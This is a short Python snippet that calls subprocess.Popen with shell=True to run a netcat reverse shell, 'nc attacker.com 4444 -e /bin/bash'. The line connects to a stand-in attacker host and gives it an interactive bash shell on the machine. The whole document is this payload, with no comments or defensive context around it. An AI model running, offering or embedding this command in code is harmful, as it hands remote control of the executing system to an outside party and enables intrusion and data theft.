import subprocess
subprocess.Popen(
    "nc attacker.com 4444 -e /bin/bash",
    shell=True
)
